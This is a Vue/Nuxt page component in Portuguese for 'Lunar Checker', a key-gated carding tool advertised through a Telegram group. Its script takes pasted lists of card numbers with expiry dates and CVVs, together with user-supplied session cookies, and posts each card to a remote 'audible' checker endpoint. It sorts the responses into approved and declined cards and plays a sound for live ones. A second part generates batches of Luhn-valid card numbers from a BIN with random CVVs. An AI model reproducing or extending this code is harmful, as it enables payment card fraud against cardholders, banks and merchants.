<template>
  <div v-if="isAuthorized" class="min-h-screen bg-black">
    <NuxtRouteAnnouncer />

    <Notification v-if="show && notificationType === 'success'" :title="notificationTitle"
      :message="notificationMessage" type="success" @close="show = false" />
    <RNotification v-if="show && notificationType === 'error'" :title="notificationTitle" :message="notificationMessage"
      type="error" @close="show = false" />
    <ENotification v-if="show && notificationType === 'warning'" :title="notificationTitle"
      :message="notificationMessage" type="warning" @close="show = false" />

    <!-- Header -->
    <header class="w-screen h-fit bg-[#0a0a0a]/80 backdrop-blur-md border-b border-[#131313] fixed top-0 left-0 z-50">
      <div class="flex flex-row items-center justify-between max-w-7xl mx-auto px-6 py-4">
        <div class="flex flex-row items-center">
          <a href="https://t.me/lunaroficial" target="_blank">
            <div class="flex justify-center items-center bg-[#222222] h-fit w-fit rounded-lg">
              <Icon class="text-white m-2" size="45px" name="flowbite:moon-solid"></Icon>
            </div>
          </a>

          <div class="flex flex-col justify-center ml-4">
            <p class="text-white font-montserrat font-black text-3xl">Lunar Checker</p>
            <p class="text-[#888888] font-montserrat text-base">Telegram: t.me/lunaroficial</p>
          </div>
        </div>
        <div class="flex items-center">
          <a href="https://t.me/lunaroficial" target="_blank" class="flex items-center">
            <SecondaryButton name="entypo:chat" size="24px">
              Grupo
            </SecondaryButton>
          </a>
        </div>
      </div>
    </header>

    <!-- Botões de Acesso às Seções -->
    <div class="flex items-center justify-center pt-32">
      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-w-7xl w-full px-6">
        <!-- Botão Configurações -->
        <button @click="toggleSettings"
          class="flex flex-col items-center justify-center h-28 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg hover:bg-[#1f1f1f] hover:border-[#333333] hover:shadow-lg transition duration-300 text-white font-montserrat text-lg font-bold">
          <Icon class="mb-2" name="fa6-solid:gear" size="32px" />
          Configurações
        </button>

        <!-- Botão Resultados -->
        <button @click="toggleResults"
          class="flex flex-col items-center justify-center h-28 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg hover:bg-[#1f1f1f] hover:border-[#333333] hover:shadow-lg transition duration-300 text-white font-montserrat text-lg font-bold">
          <Icon class="mb-2" name="fa6-solid:list-ul" size="32px" />
          Resultados
        </button>

        <!-- Botão Gerar CC's -->
        <button @click="toggleCcs"
          class="flex flex-col items-center justify-center h-28 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg hover:bg-[#1f1f1f] hover:border-[#333333] hover:shadow-lg transition duration-300 text-white font-montserrat text-lg font-bold">
          <Icon class="mb-2" name="material-symbols:credit-card-gear-sharp" size="32px" />
          Gerar CC's
        </button>
      </div>
    </div>

    <!-- Modals -->
    <Modal v-model="showSettings">
      <div class="flex items-center mb-4">
        <div class="w-12 h-12 bg-[#222222] rounded-lg flex items-center justify-center">
          <Icon class="text-white" name="fa6-solid:gear" size="30px"></Icon>
        </div>
        <p class="ml-4 font-montserrat text-white text-2xl font-black">Configurações</p>
      </div>

      <label class="text-white font-montserrat font-medium">Gateway</label>
      <div class="flex flex-col md:flex-row mt-2 gap-4">
        <select
          class="w-full md:w-1/4 h-12 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
          <option value="BR">Amazon BR</option>
          <option value="IT">Amazon IT</option>
          <option selected value="US">Amazon US</option>
        </select>
        <select v-model="threads"
          class="w-full md:w-1/4 h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
          <option selected value="SL">Selecione o Multithread</option>
          <option value="1">1x</option>
          <option value="2">2x</option>
          <option value="3">3x</option>
          <option value="4">4x</option>
        </select>
        <input v-model="cookies" type="text" placeholder="Insira os cookies aqui..."
          class="flex-1 p-2.5 h-12 bg-[#0a0a0a] border-2 border-[#2c2c2c] text-white rounded-lg font-montserrat focus:border-zinc-500 transition" />
        <SecondaryButton @click="toggleSettings(); salvarCookies();" name="material-symbols:save">Salvar
        </SecondaryButton>
      </div>
    </Modal>

    <Modal v-model="showResults">
      <div class="flex items-center mb-4">
        <div class="w-12 h-12 bg-[#222222] rounded-lg flex items-center justify-center">
          <Icon class="text-white" name="fa6-solid:list-ul" size="30px" />
        </div>
        <p class="ml-4 font-montserrat text-white text-2xl font-black">Lista</p>
      </div>

      <!-- Seção de Aprovados -->
      <Section>
        <div class="flex items-center justify-between">
          <div class="flex flex-row items-left justify-left ml-2 p-2">
            <Icon class="text-white" size="22px" name="mdi:at"></Icon>
            <label class="text-white font-montserrat font-medium pl-2">Aprovadas</label>
          </div>
          <div class="flex items-right justify-right pr-2 gap-2">
            <Icon class="text-white cursor-pointer" name="bxs:copy" @click="copiarLista('aprovados')" />
            <Icon class="text-white cursor-pointer" name="tabler:trash-filled" @click="deletarLista('aprovados')" />
            <Icon class="text-white cursor-pointer" :name="mostrarAprovados ? 'ep:arrow-up-bold' : 'ep:arrow-down-bold'"
              @click="toggleLista('aprovados')" />
          </div>
        </div>
        <div v-if="mostrarAprovados" class="overflow-y-auto max-h-32 pr-2 pb-4 scroll-smooth">
          <ul v-if="aprovados.length" class="text-white space-y-1 ml-4">
            <Approved v-for="(aprovado, index) in aprovados" :key="index">
              <li class="text-sm font-montserrat">{{ aprovado }}</li>
            </Approved>
          </ul>
          <p v-else class="text-white text-sm font-montserrat ml-4">Sem cartões aprovados.</p>
        </div>
      </Section>

      <!-- Seção de Recusados -->
      <Section>
        <div class="flex items-center justify-between">
          <div class="flex flex-row items-left justify-left ml-2 p-2">
            <Icon class="text-white" size="22px" name="mdi:at"></Icon>
            <label class="text-white font-montserrat font-medium pl-2">Recusadas</label>
          </div>
          <div class="flex items-right justify-right pr-2 gap-2">
            <Icon class="text-white cursor-pointer" name="tabler:trash-filled" @click="deletarLista('recusados')" />
            <Icon class="text-white cursor-pointer" :name="mostrarRecusados ? 'ep:arrow-up-bold' : 'ep:arrow-down-bold'"
              @click="toggleLista('recusados')" />
          </div>
        </div>
        <div v-if="mostrarRecusados" class="overflow-y-auto max-h-32 pr-2 pb-4 scroll-smooth">
          <ul v-if="recusados.length" class="text-white space-y-1 ml-4">
            <Refused v-for="(recusado, index) in recusados" :key="index">
              <li class="text-sm font-montserrat">{{ recusado }}</li>
            </Refused>
          </ul>
          <p v-else class="text-white text-sm font-montserrat ml-4">Sem cartões recusados.</p>
        </div>
      </Section>

      <!-- Seção de Erros -->
      <Section>
        <div class="flex items-center justify-between">
          <div class="flex flex-row items-left justify-left ml-2 p-2">
            <Icon class="text-white" size="22px" name="mdi:at"></Icon>
            <label class="text-white font-montserrat font-medium pl-2">Erros</label>
          </div>
          <div class="flex items-right justify-right pr-2 gap-2">
            <Icon class="text-white cursor-pointer" name="tabler:trash-filled" @click="deletarLista('erros')" />
            <Icon class="text-white cursor-pointer" :name="mostrarErros ? 'ep:arrow-up-bold' : 'ep:arrow-down-bold'"
              @click="toggleLista('erros')" />
          </div>
        </div>
        <div v-if="mostrarErros" class="overflow-y-auto max-h-32 pr-2 pb-4 scroll-smooth">
          <ul v-if="erros.length" class="text-white space-y-1 ml-4">
            <Error v-for="(erro, index) in erros" :key="index">
              <li class="text-sm font-montserrat">{{ erro }}</li>
            </Error>
          </ul>
          <p v-else class="text-white text-sm font-montserrat ml-4">Nenhum erro encontrado.</p>
        </div>
      </Section>
    </Modal>

    <Modal v-model="showCcs">
      <div class="flex flex-col">
        <div class="flex items-center mb-4">
          <div class="w-12 h-12 bg-[#222222] rounded-lg flex items-center justify-center">
            <Icon class="text-white" name="material-symbols:credit-card-gear-sharp" size="30px" />
          </div>
          <p class="ml-4 font-montserrat text-white text-2xl font-black">Gerador de Cc's</p>
        </div>

        <!-- Campo de entrada para a matriz -->
        <label class="text-white font-montserrat font-medium pb-2">Insira a sua matriz</label>
        <input v-model="matriz" @keydown.space.prevent @input="onInputSemEspaco"
          class="flex w-full font-montserrat p-2.5 h-12 rounded-lg bg-[#0a0a0a] border border-[#2c2c2c] focus:outline focus:border-zinc-500 hover:border-zinc-600 duration-300 ease-in text-white"
          type="text" placeholder="Matriz" />

        <div class="flex flex-row items-center justify-center mt-2 gap-2">
          <!-- Seletor de mês -->
          <select v-model="mes"
            class="w-full h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
            <option value="SL" disabled selected>Selecione um mês</option>
            <option value="01">Janeiro (01)</option>
            <option value="02">Fevereiro (02)</option>
            <option value="03">Março (03)</option>
            <option value="04">Abril (04)</option>
            <option value="05">Maio (05)</option>
            <option value="06">Junho (06)</option>
            <option value="07">Julho (07)</option>
            <option value="08">Agosto (08)</option>
            <option value="09">Setembro (09)</option>
            <option value="10">Outubro (10)</option>
            <option value="11">Novembro (11)</option>
            <option value="12">Dezembro (12)</option>
          </select>

          <!-- Seletor de ano -->
          <select v-model="ano"
            class="w-full h-12 bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg opacity-60 drop-shadow-xl hover:opacity-80 hover:drop-shadow-2xl duration-300 ease-in text-white text-sm rounded-lg p-2.5 font-montserrat">
            <option value="SL" disabled selected>Selecione um ano</option>
            <option value="25">2025</option>
            <option value="26">2026</option>
            <option value="27">2027</option>
            <option value="28">2028</option>
            <option value="29">2029</option>
            <option value="30">2030</option>
            <option value="31">2031</option>
            <option value="32">2032</option>
            <option value="33">2033</option>
            <option value="34">2034</option>
            <option value="35">2035</option>
            <option value="36">2036</option>
          </select>

          <!-- Campo para quantidade de cartões -->
          <input v-model="quantidade"
            class="flex w-full font-montserrat p-2.5 h-12 rounded-lg bg-[#0a0a0a] border border-[#2c2c2c] focus:outline focus:border-zinc-500 hover:border-zinc-600 duration-300 ease-in text-white"
            type="number" maxlength="3" max="150" placeholder="Quantidade" />
        </div>

        <!-- Botão para gerar os cartões -->
        <SecondaryButton @click="gerarCartoes(); showToast()" class="mt-2" size="24px"
          name="material-symbols:credit-card-gear-sharp">
          Gerar
        </SecondaryButton>

        <!-- Área para exibição dos cartões gerados -->
        <textarea v-if="cartoes.length" v-model="cartoesOutput" readonly
          class="mt-4 p-2 w-full bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg h-32 text-white"></textarea>
      </div>
    </Modal>

    <!-- Checker Section -->
    <div class="flex items-center justify-center mt-5">
      <div
        class="flex flex-col w-full max-w-[1233px] h-fit ml-6 mr-6 pb-8 bg-[#0a0a0a] border border-[#2c2c2c] rounded-xl drop-shadow-xl">
        <div class="flex flex-row">

          <div class="flex items-center justify-center m-6 w-12 h-12 bg-[#222222] rounded-lg shadow-lg">
            <svg class="text-white" xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24">
              <path fill="currentColor"
                d="M8 17q.425 0 .713-.288T9 16t-.288-.712T8 15t-.712.288T7 16t.288.713T8 17m0-4q.425 0 .713-.288T9 12t-.288-.712T8 11t-.712.288T7 12t.288.713T8 13m0-4q.425 0 .713-.288T9 8t-.288-.712T8 7t-.712.288T7 8t.288.713T8 9m4 8h4q.425 0 .713-.288T17 16t-.288-.712T16 15h-4q-.425 0-.712.288T11 16t.288.713T12 17m0-4h4q.425 0 .713-.288T17 12t-.288-.712T16 11h-4q-.425 0-.712.288T11 12t.288.713T12 13m0-4h4q.425 0 .713-.288T17 8t-.288-.712T16 7h-4q-.425 0-.712.288T11 8t.288.713T12 9M5 21q-.825 0-1.412-.587T3 19V5q0-.825.588-1.412T5 3h14q.825 0 1.413.588T21 5v14q0 .825-.587 1.413T19 21z" />
            </svg>
          </div>

          <div class="mt-8">
            <p class="font-montserrat text-white text-2xl font-black">Lista de Cartões</p>
          </div>

        </div>
        <div class="flex flex-col">
          <div class="ml-6 mb-2">
            <p class="font-montserrat text-white">Insira a sua lista de cartões abaixo:</p>
          </div>
          <div class="pl-6 pr-6">
            <div class="flex flex-col">
              <textarea v-model="lista"
                class="flex w-full font-montserrat p-2.5 h-36 rounded-lg bg-[#0a0a0a] border border-[#2c2c2c] focus:outline focus:border-zinc-500 hover:border-zinc-600 text-white"
                type="text" id="lista" placeholder="Formato: CCCCCCCCCCCCCCCC|MM|YYYY|CVV">
          </textarea>
            </div>

          </div>
          <div class="flex flex-row mt-4 ml-6 gap-2">
            <SecondaryButton @click="verificarCartoes(); show = true" :disabled="isRunning.value" size="24px"
              name="material-symbols:play-arrow-rounded">
              Iniciar
            </SecondaryButton>
            <SecondaryButton @click="pausarVerificacao" :disabled="!isRunning.value || isPaused.value" size="24px"
              name="material-symbols:pause">
              Pausar
            </SecondaryButton>
          </div>
        </div>
      </div>
    </div>
    <footer class="flex items-center justify-center mt-10 pb-4">
      <p class="text-white font-montserrat text-sm">
        <span class="text-gray-500">&lt;\</span>
        Desenvolvido por
        <a href="https://t.me/lunaroficial" target="_blank" class="text-blue-500 hover:underline">Lunar Bins</a>
        <span class="text-gray-500"> &gt;</span>
      </p>
    </footer>
  </div>
  <div v-else class="min-h-screen flex items-center justify-center bg-black text-white">
    <div class="flex flex-col items-center">
      <Section class="flex items-center justify-center gap-2 p-4 max-w-3xl">
        <p class="font-montserrat text-white text-2xl font-black pt-2 pb-2">
          Lunar - Key Verify
        </p>
        <div class="flex flex-row">
          <p class="font-montserrat">Join our</p>
          <a href="https://t.me/lunaroficial" target="_blank">
            <p class="text-blue-500 pl-1 pr-1  font-montserrat">Telegram</p>
          </a>
          <p class="font-montserrat">and use /key to get your key!</p>
        </div>
        <input v-model="userKey" type="text" placeholder="Enter your key here..."
          class="p-2 w-full bg-[#0a0a0a] border border-[#2c2c2c] rounded-lg text-white text-center font-montserrat" />
        <SecondaryButton @click="validarKey" class="w-full">
          Validate key
        </SecondaryButton>
        <p v-if="errorMessage" class="text-red-500 ml-2 mr-2">{{ errorMessage }}</p>
      </Section>
    </div>
  </div>
</template>

<style>
.scroll-smooth {
  scroll-behavior: smooth;
}
</style>

<script setup>
import Notification from '~/components/Notification.vue'
import { ref } from 'vue';

const lista = ref('');
const cookies = ref('');
const aprovados = ref([]);
const recusados = ref([]);
const erros = ref([]);
const threads = ref(1); // Número de threads padrão (1x)
const show = ref(false);
const notificationTitle = ref('');
const notificationMessage = ref('');
const notificationType = ref('success'); // Tipos: success, error, warning

const mostrarAprovados = ref(true);
const mostrarRecusados = ref(false);
const mostrarErros = ref(false);

const matriz = ref("");
const mes = ref("SL");
const ano = ref("SL");
const quantidade = ref(1);
const cartoes = ref([]);
const cartoesOutput = ref("");

const showSettings = ref(false);
const showResults = ref(false);
const showCcs = ref(false);

const isRunning = ref(false);
const isPaused = ref(false);

const live = typeof Audio !== 'undefined' ? new Audio('./audios/live.mp3') : null;
const notificationAudio = typeof Audio !== 'undefined' ? new Audio('./audios/notification.mp3') : null;
const notificationSuccessAudio = typeof Audio !== 'undefined' ? new Audio('./audios/notificationSuccess.mp3') : null;

let notificacaoAtiva = false; // Controle para evitar múltiplas notificações simultâneas

const isAuthorized = ref(false); // Estado para verificar se o usuário está autorizado
const userKey = ref(''); // Key inserida pelo usuário
const errorMessage = ref(''); // Mensagem de erro para exibir ao usuário

async function validarKey() {
  if (!userKey.value.trim()) {
    errorMessage.value = 'Please, enter a valid key.';
    return;
  }

  try {
    const response = await fetch(`https://lunarcntr.xyz/api/api.php?key=${userKey.value}`);
    const data = await response.json();

    if (data.valid) {
      isAuthorized.value = true; // Permite o acesso ao site
    } else {
      errorMessage.value = 'Key inválida! Verifique e tente novamente.';
    }
  } catch (error) {
    console.error('Erro ao validar a key:', error);
    errorMessage.value = 'Erro ao validar a key. Tente novamente mais tarde.';
  }
}

function exibirNotificacao(titulo, mensagem, tipo = 'success') {
  if (notificacaoAtiva) return; // Evita exibir notificações enquanto uma está ativa

  notificacaoAtiva = true; // Marca a notificação como ativa
  show.value = false; // Garante que a notificação anterior seja removida

  setTimeout(() => {
    notificationTitle.value = titulo;
    notificationMessage.value = mensagem;
    notificationType.value = tipo;

    // Reproduz o áudio correto com base no tipo de notificação
    if (tipo === 'success') {
      if (notificationSuccessAudio) {
        notificationSuccessAudio.currentTime = 0;
        notificationSuccessAudio.play();
      }
    } else {
      if (notificationAudio) {
        notificationAudio.currentTime = 0;
        notificationAudio.play();
      }
    }

    show.value = true; // Exibe a nova notificação

    // Libera a notificação após o tempo de exibição
    setTimeout(() => {
      notificacaoAtiva = false; // Permite novas notificações
      show.value = false; // Remove a notificação da tela
    }, 4000); // Tempo de exibição da notificação (4 segundos)
  }, 100); // Pequeno atraso para evitar conflitos
}

function extrairBancoDaResposta(html) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const span = doc.querySelector('.badge-primary');
  return span ? span.textContent.trim() : 'Banco desconhecido';
}

function salvarCookies() {
  exibirNotificacao('Sucesso', 'As suas configurações foram salvas com sucesso.', 'success');
}

function copiarLista(tipo) {
  let lista = [];
  let titulo = '';

  if (tipo === 'aprovados') {
    lista = aprovados.value;
    titulo = '#Aprovada';
  } else if (tipo === 'recusados') {
    lista = recusados.value;
    titulo = '#Recusada';
  } else if (tipo === 'erros') {
    lista = erros.value;
    titulo = '#Erro';
  }

  if (lista.length) {
    const conteudo = lista.map((linha) => `${titulo} ${linha}`).join('\n');
    navigator.clipboard
      .writeText(conteudo)
      .then(() => {
        alert(`${titulo.replace('#', '')} copiados para a área de transferência!`);
      })
      .catch(() => {
        alert('Erro ao copiar a lista.');
      });
  } else {
    alert(`A lista de ${titulo.replace('#', '').toLowerCase()} está vazia.`);
  }
}

function deletarLista(tipo) {
  if (tipo === 'aprovados') {
    if (confirm('Tem certeza que deseja deletar os aprovados?')) {
      aprovados.value = [];
    }
  } else if (tipo === 'recusados') {
    recusados.value = [];
  } else if (tipo === 'erros') {
    erros.value = [];
  }
}

function toggleLista(tipo) {
  if (tipo === 'aprovados') mostrarAprovados.value = !mostrarAprovados.value;
  else if (tipo === 'recusados') mostrarRecusados.value = !mostrarRecusados.value;
  else if (tipo === 'erros') mostrarErros.value = !mostrarErros.value;
}

function toggleSettings() {
  showSettings.value = !showSettings.value;
}

function toggleResults() {
  showResults.value = !showResults.value;
}

function toggleCcs() {
  showCcs.value = !showCcs.value;
}

async function verificarCartoes() {
  if (!lista.value.trim()) {
    exibirNotificacao('Erro', 'Insira a lista de cartões para verificar.', 'error');
    return;
  }

  if (!cookies.value.trim()) {
    exibirNotificacao('Erro', 'Insira os cookies necessários.', 'error');
    return;
  }

  exibirNotificacao('Checker iniciado', 'O checker foi iniciado com sucesso, verifique os resultados.', 'success');

  isRunning.value = true;
  isPaused.value = false;

  const headers = new Headers({
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://lunarcntr.xyz',
    'referer': 'https://lunarcntr.xyz/nopsetted2/',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  });

  let linhas = lista.value.trim().split('\n');

  while (linhas.length > 0) {
    if (!isRunning.value) {
      exibirNotificacao('Interrompido', 'O checker foi interrompido.', 'warning');
      return;
    }

    if (isPaused.value) {
      await new Promise((resolve) => {
        const interval = setInterval(() => {
          if (!isPaused.value) {
            clearInterval(interval);
            resolve();
          }
        }, 500);
      });
    }

    const lote = linhas.splice(0, threads.value); // Processa o número de linhas baseado no valor de threads

    await Promise.all(
      lote.map(async (linha) => {
        try {
          const response = await fetch('https://lunarcntr.xyz/nopsetted2/checkers/free/audible/api.php', {
            method: 'POST',
            mode: 'cors',
            headers: headers,
            body: new URLSearchParams({
              lista: linha,
              cookie: cookies.value,
            }),
          });

          if (!response.ok) {
            erros.value.push(`${linha} ➔ Erro na requisição`);
            return;
          }

          const text = await response.text();
          const banco = extrairBancoDaResposta(text);

          // Verifica o conteúdo da resposta para determinar o status
          if (text.includes('badge-warning')) {
            erros.value.push(`${linha} ➔ ${banco}`);
          } else if (text.includes('badge-danger')) {
            recusados.value.push(`${linha} ➔ ${banco}`);
          } else if (text.includes('badge-success')) {
            aprovados.value.push(`${linha} ➔ ${banco}`);
            if (live) {
              live.currentTime = 0;
              live.play();
            }
          } else {
            erros.value.push(`${linha} ➔ Resposta inesperada`);
          }
        } catch (err) {
          erros.value.push(`${linha} ➔ Ocorreu um erro: ${err.message}`);
        }
      })
    );

    lista.value = linhas.join('\n'); // Atualiza a lista com as linhas restantes
  }

  isRunning.value = false;
  exibirNotificacao('Concluído', 'A lista foi concluída.', 'success');
}

function pausarVerificacao() {
  if (isRunning.value) {
    isPaused.value = true;
    exibirNotificacao('Pausado', 'O checker foi pausado.', 'warning');
  }
}

function onInputSemEspaco(event) {
  matriz.value = event.target.value.replace(/\s+/g, '');
}

function gerarNumeroLuhn(bin, totalLength) {
  while (bin.length < totalLength - 1) {
    bin += Math.floor(Math.random() * 10);
  }

  let soma = 0;
  for (let i = 0; i < bin.length; i++) {
    let num = parseInt(bin.charAt(bin.length - 1 - i));
    if (i % 2 === 0) num *= 2;
    if (num > 9) num -= 9;
    soma += num;
  }

  const digitoVerificador = (10 - (soma % 10)) % 10;
  return bin + digitoVerificador;
}

function gerarCartoes() {
  if (!matriz.value || matriz.value.length < 6 || matriz.value.length > 15) {
    exibirNotificacao('Aviso', 'Insira uma matriz válida para gerar os cartões.', 'warning');
    return;
  }

  // Gera valores aleatórios para mês e ano, caso não sejam selecionados
  const mesAleatorio = () => String(Math.floor(Math.random() * 12) + 1).padStart(2, '0'); // Gera de "01" a "12"
  const anoAleatorio = () => String(Math.floor(Math.random() * 11) + 25); // Gera de "25" (2025) a "35" (2035)

  const mesSelecionado = mes.value === "SL" ? mesAleatorio() : mes.value;
  const anoSelecionado = ano.value === "SL" ? anoAleatorio() : ano.value;
  const quantidadeSelecionada = isNaN(quantidade.value) || quantidade.value < 1 || quantidade.value > 150
    ? 10 // Gera 10 cartões por padrão
    : quantidade.value;

  cartoes.value = [];
  for (let i = 0; i < quantidadeSelecionada; i++) {
    const isAmex = matriz.value.startsWith("34") || matriz.value.startsWith("37");
    const numero = gerarNumeroLuhn(matriz.value, isAmex ? 15 : 16);

    const cvv = isAmex
      ? Math.floor(1000 + Math.random() * 9000)
      : Math.floor(100 + Math.random() * 900);

    cartoes.value.push(`${numero}|${mesSelecionado}|20${anoSelecionado}|${cvv}`);
  }

  cartoesOutput.value = cartoes.value.join("\n");

  navigator.clipboard.writeText(cartoesOutput.value)
    .then(() => {
      exibirNotificacao('Sucesso', 'Cartões gerados e copiados!', 'success');
    })
    .catch(() => {
      exibirNotificacao('Erro', 'Erro ao copiar cartões.', 'error');
    });
}
</script>